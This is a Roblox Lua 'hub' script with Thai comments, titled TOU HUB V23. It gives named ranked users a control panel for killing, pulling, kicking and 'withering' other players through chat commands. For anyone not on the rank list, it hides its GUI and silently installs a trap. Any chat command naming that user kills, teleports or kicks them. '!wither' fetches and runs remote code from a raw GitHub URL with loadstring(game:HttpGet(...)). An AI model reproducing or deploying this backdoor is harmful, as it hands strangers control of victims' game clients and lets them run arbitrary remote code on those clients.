--// TOU HUB V23 - FULL SCRIPT: คนไม่มีสิทธิ์ & basic โดนทุกคำสั่ง! 🕵️‍♂️👑
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local player = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")

--// === ระบบยศ (กำหนดผู้ใช้) ===
local Ranks = {
    DEX = {"birdV2_123"},          -- ยศสูงสุด (เฉพาะ DEX ใช้ !Wither)
    Premium = {},                  -- เพิ่มชื่อได้ที่นี่
    basic = {"AniF_Xx"}            -- basic (โดนคำสั่งจาก Premium/DEX)
}

--// ฟังก์ชันเช็คยศ
local function getRank(username)
    if table.find(Ranks.DEX, username) then return "DEX" end
    if table.find(Ranks.Premium, username) then return "Premium" end
    if table.find(Ranks.basic, username) then return "basic" end
    return nil
end

local myRank = getRank(player.Name)

--// === ถ้าไม่มีสิทธิ์ → ซ่อน GUI + ไม่ให้พิมพ์คำสั่ง + โดนทุกคำสั่ง ===
if not myRank then
    -- คนไม่มีสิทธิ์: โดนทุกคำสั่ง + ไม่พิมพ์ได้
    local trapConnection
    trapConnection = TextChatService.TextChannels.RBXGeneral.OnMessageDoneFiltering:Connect(function(message)
        local text = message.Text:lower()
        local sender = message.TextSource
        if not sender then return end
        local p = Players:GetPlayerByUserId(sender.UserId)
        if not p then return end

        local targetName = player.Name:lower()

        -- !ฆ่า
        if text:find("!ฆ่า") and text:find(targetName) then
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Health = 0
            end
        end

        -- !ดึง
        if text:find("!ดึง") and text:find(targetName) then
            local senderPlayer = Players:GetPlayerByUserId(sender.UserId)
            if senderPlayer and senderPlayer.Character and senderPlayer.Character:FindFirstChild("HumanoidRootPart") then
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    player.Character.HumanoidRootPart.CFrame = senderPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                end
            end
        end

        -- !เตะ
        if text:find("!เตะ") and text:find(targetName) then
            player:Kick("🥰")
        end

        -- !wither (รันในฝั่งคนไม่มีสิทธิ์)
        if text:find("!wither") and text:find(targetName) then
            spawn(function()
                pcall(function()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
                end)
            end)
        end
    end)
    return
end

--// === สร้าง GUI เฉพาะคนมียศ ===
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TOU_HUB_GUI"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

--// ปุ่ม Toggle แยก (ลากได้)
local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Size = UDim2.new(0, 60, 0, 60)
ToggleBtn.Position = UDim2.new(0, 20, 0.5, -30)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
ToggleBtn.Text = "🔥"
ToggleBtn.TextColor3 = Color3.new(1,1,1)
ToggleBtn.Font = Enum.Font.GothamBold
ToggleBtn.TextSize = 24
ToggleBtn.Active = true
ToggleBtn.Draggable = true
ToggleBtn.Parent = ScreenGui

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(1, 0)
ToggleCorner.Parent = ToggleBtn

local ToggleShadow = Instance.new("ImageLabel")
ToggleShadow.Size = UDim2.new(1, 8, 1, 8)
ToggleShadow.Position = UDim2.new(0, -4, 0, -4)
ToggleShadow.BackgroundTransparency = 1
ToggleShadow.Image = "rbxassetid://6014261993"
ToggleShadow.ImageColor3 = Color3.new(0,0,0)
ToggleShadow.ImageTransparency = 0.7
ToggleShadow.ZIndex = 0
ToggleShadow.Parent = ToggleBtn

--// GUI หลัก (เริ่มซ่อน)
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 800, 0, 400)
MainFrame.Position = UDim2.new(0.5, -400, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Visible = false
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 12)
Corner.Parent = MainFrame

local Shadow = Instance.new("ImageLabel")
Shadow.Size = UDim2.new(1, 10, 1, 10)
Shadow.Position = UDim2.new(0, -5, 0, -5)
Shadow.BackgroundTransparency = 1
Shadow.Image = "rbxassetid://6014261993"
Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
Shadow.ImageTransparency = 0.6
Shadow.ZIndex = 0
Shadow.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundTransparency = 1
Title.Text = "ยศ: " .. myRank .. " 🔥 TOU HUB V23"
Title.TextColor3 = myRank == "DEX" and Color3.fromRGB(255, 215, 0) or
                 myRank == "Premium" and Color3.fromRGB(0, 255, 255) or
                 Color3.fromRGB(100, 255, 100)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = MainFrame

local ScrollFrame = Instance.new("ScrollingFrame")
ScrollFrame.Size = UDim2.new(1, -20, 1, -70)
ScrollFrame.Position = UDim2.new(0, 10, 0, 60)
ScrollFrame.BackgroundTransparency = 1
ScrollFrame.ScrollBarThickness = 6
ScrollFrame.ClipsDescendants = true
ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollFrame.Parent = MainFrame

local UIGridLayout = Instance.new("UIGridLayout")
UIGridLayout.CellSize = UDim2.new(0, 780, 0, 80)
UIGridLayout.CellPadding = UDim2.new(0, 10, 0, 10)
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.Parent = ScrollFrame

--// ตารางเก็บชื่อ
local nameLog = {}

--// ฟังก์ชันส่งแชท
local function sendChat(msg)
    pcall(function()
        local channel = TextChatService.TextChannels.RBXGeneral
        if channel then channel:SendAsync(msg) end
    end)
end

--// ฟังก์ชันดึง (วาปจริงทุกคนเห็น)
local function pullPlayer(targetName)
    local targetRank = getRank(targetName)
    if targetRank == "DEX" then return end
    local victim = Players:FindFirstChild(targetName)
    if victim and victim.Character and victim.Character:FindFirstChild("HumanoidRootPart") then
        local myRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if myRoot then
            victim.Character.HumanoidRootPart.CFrame = myRoot.CFrame * CFrame.new(0, 0, -3)
            sendChat("📍 **ดึงแล้ว:** " .. targetName)
        end
    end
end

--// ฟังก์ชันเตะ
local function kickPlayer(targetName)
    local targetRank = getRank(targetName)
    if targetRank == "DEX" then return end
    local victim = Players:FindFirstChild(targetName)
    if victim then victim:Kick("🥰") end
end

--// ฟังก์ชันฆ่า
local function killPlayer(targetName)
    local targetRank = getRank(targetName)
    if targetRank == "DEX" then return end
    local victim = Players:FindFirstChild(targetName)
    if victim and victim.Character and victim.Character:FindFirstChild("Humanoid") then
        victim.Character.Humanoid.Health = 0
    end
end

--// ฟังก์ชันเพิ่มชื่อลง GUI (แนวนอน)
local function addToGUI(realName, displayName, thumb, triggerType)
    if nameLog[realName] then return end
    nameLog[realName] = true

    local Entry = Instance.new("Frame")
    Entry.Size = UDim2.new(1, 0, 0, 80)
    Entry.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    Entry.BorderSizePixel = 0
    Entry.LayoutOrder = #ScrollFrame:GetChildren()
    Entry.Parent = ScrollFrame

    local EntryCorner = Instance.new("UICorner")
    EntryCorner.CornerRadius = UDim.new(0, 8)
    EntryCorner.Parent = Entry

    local Avatar = Instance.new("ImageLabel")
    Avatar.Size = UDim2.new(0, 60, 0, 60)
    Avatar.Position = UDim2.new(0, 10, 0, 10)
    Avatar.BackgroundTransparency = 1
    Avatar.Image = thumb
    Avatar.Parent = Entry

    local AvatarCorner = Instance.new("UICorner")
    AvatarCorner.CornerRadius = UDim.new(1, 0)
    AvatarCorner.Parent = Avatar

    local InfoFrame = Instance.new("Frame")
    InfoFrame.Size = UDim2.new(0, 200, 1, 0)
    InfoFrame.Position = UDim2.new(0, 80, 0, 0)
    InfoFrame.BackgroundTransparency = 1
    InfoFrame.Parent = Entry

    local RealNameLabel = Instance.new("TextLabel")
    RealNameLabel.Size = UDim2.new(1, 0, 0.5, 0)
    RealNameLabel.BackgroundTransparency = 1
    RealNameLabel.Text = "👤 " .. realName
    RealNameLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
    RealNameLabel.Font = Enum.Font.GothamBold
    RealNameLabel.TextXAlignment = Enum.TextXAlignment.Left
    RealNameLabel.Parent = InfoFrame

    local DisplayLabel = Instance.new("TextLabel")
    DisplayLabel.Size = UDim2.new(1, 0, 0.5, 0)
    DisplayLabel.Position = UDim2.new(0, 0, 0.5, 0)
    DisplayLabel.BackgroundTransparency = 1
    DisplayLabel.Text = "🖊️ " .. displayName
    DisplayLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
    DisplayLabel.Font = Enum.Font.Gotham
    DisplayLabel.TextXAlignment = Enum.TextXAlignment.Left
    DisplayLabel.Parent = InfoFrame

    local TriggerLabel = Instance.new("TextLabel")
    TriggerLabel.Size = UDim2.new(0, 120, 0, 25)
    TriggerLabel.Position = UDim2.new(0, 290, 0, 10)
    TriggerLabel.BackgroundColor3 = triggerType == "check" and Color3.fromRGB(0, 100, 0) or Color3.fromRGB(100, 0, 0)
    TriggerLabel.Text = triggerType == "check" and "✅ !เช็ค" or "🔥 SCRIPT"
    TriggerLabel.TextColor3 = Color3.new(1,1,1)
    TriggerLabel.Font = Enum.Font.GothamBold
    TriggerLabel.TextSize = 14
    TriggerLabel.Parent = Entry
    local tc = Instance.new("UICorner", TriggerLabel); tc.CornerRadius = UDim.new(0,6)

    -- ปุ่มคำสั่งแนวนอน
    local ButtonFrame = Instance.new("Frame")
    ButtonFrame.Size = UDim2.new(0, 450, 1, 0)
    ButtonFrame.Position = UDim2.new(0, 320, 0, 0)
    ButtonFrame.BackgroundTransparency = 1
    ButtonFrame.Parent = Entry

    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.FillDirection = Enum.FillDirection.Horizontal
    UIListLayout.Padding = UDim.new(0, 8)
    UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    UIListLayout.Parent = ButtonFrame

    local function addCmdBtn(text, color, action)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 70, 0, 40)
        btn.BackgroundColor3 = color
        btn.Text = text
        btn.TextColor3 = Color3.new(1,1,1)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.Parent = ButtonFrame
        local c = Instance.new("UICorner", btn); c.CornerRadius = UDim.new(0, 8)
        btn.MouseButton1Click:Connect(action)
    end

    if myRank == "DEX" or myRank == "Premium" then
        addCmdBtn("ฆ่า", Color3.fromRGB(180,20,20), function()
            sendChat("!ฆ่า " .. realName)
            killPlayer(realName)
        end)
    end

    if myRank == "DEX" or myRank == "Premium" or myRank == "basic" then
        addCmdBtn("ดึง", Color3.fromRGB(20,120,180), function()
            sendChat("!ดึง " .. realName)
            pullPlayer(realName)
        end)
    end

    if myRank == "DEX" or myRank == "Premium" then
        addCmdBtn("เตะ", Color3.fromRGB(180,120,20), function()
            sendChat("!เตะ " .. realName)
            kickPlayer(realName)
        end)
    end

    addCmdBtn("เช็ค", Color3.fromRGB(100,255,100), function()
        sendChat("!เช็ค " .. realName)
    end)

    -- ปุ่ม !Wither (เฉพาะ DEX)
    if myRank == "DEX" then
        addCmdBtn("WITHER", Color3.fromRGB(100, 0, 100), function()
            sendChat("!Wither " .. realName)
        end)
    end

    addCmdBtn("ล้าง", Color3.fromRGB(100,100,100), function()
        nameLog[realName] = nil
        Entry:Destroy()
    end)

    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIGridLayout.AbsoluteContentSize.Y + 20)
end

--// ตรวจจับข้อความด้วย OnMessageDoneFiltering (เฉพาะคนมียศ)
local channel = TextChatService.TextChannels.RBXGeneral
channel.OnMessageDoneFiltering:Connect(function(message)
    local text = message.Text
    local sender = message.TextSource
    if not sender then return end
    local p = Players:GetPlayerByUserId(sender.UserId)
    if not p then return end

    local realName = p.Name
    local displayName = p.DisplayName
    local thumb = Players:GetUserThumbnailAsync(sender.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)

    local lower = text:lower()

    -- !เช็ค: เฉพาะคนมียศที่พิมพ์ → คนมียศตอบกลับ
    if lower == "!เช็ค" then
        local senderRank = getRank(realName)
        if senderRank then
            if sender.UserId ~= player.UserId then
                addToGUI(realName, displayName, thumb, "check")
            else
                sendChat("✅ **TOU HUB ACTIVE** | " .. realName .. " 🕶️")
                addToGUI(realName, displayName, thumb, "check")
            end
        end
    end

    -- SCRIPT Trigger
    if text:upper() == "SCRIPT CITY THAILAND 2 BY:TOUX1" then
        sendChat("🔥 **TRIGGER DETECTED** | " .. realName .. " 🕵️‍♂️")
        addToGUI(realName, displayName, thumb, "script")
    end

    -- !ฆ่า, !ดึง, !เตะ จากคนมียศ → ทำงานในฝั่งเป้าหมาย (ถ้าเป้าหมายรันสคริปต์)
    local senderRank = getRank(realName)
    if senderRank == "DEX" or senderRank == "Premium" then
        if lower:find("!ฆ่า") then
            local target = lower:match("!ฆ่า%s+(%w+)")
            if target and target == player.Name:lower() then
                killPlayer(player.Name)
            end
        end
        if lower:find("!ดึง") then
            local target = lower:match("!ดึง%s+(%w+)")
            if target and target == player.Name:lower() then
                pullPlayer(player.Name)
            end
        end
        if lower:find("!เตะ") then
            local target = lower:match("!เตะ%s+(%w+)")
            if target and target == player.Name:lower() then
                kickPlayer(player.Name)
            end
        end
    end

    -- !Wither จาก DEX → รันในฝั่งเป้าหมาย (ทุกยศยกเว้น DEX)
    if myRank ~= "DEX" and lower:find("!wither") then
        local target = lower:match("!wither%s+(%w+)")
        if target and target == player.Name:lower() then
            spawn(function()
                pcall(function()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))()
                end)
            end)
        end
    end
end)

--// อัปเดต Canvas
UIGridLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIGridLayout.AbsoluteContentSize.Y + 20)
end)

--// Toggle GUI
local visible = false
ToggleBtn.MouseButton1Click:Connect(function()
    visible = not visible
    MainFrame.Visible = visible
    ToggleBtn.Text = visible and "❌" or "🔥"
end)
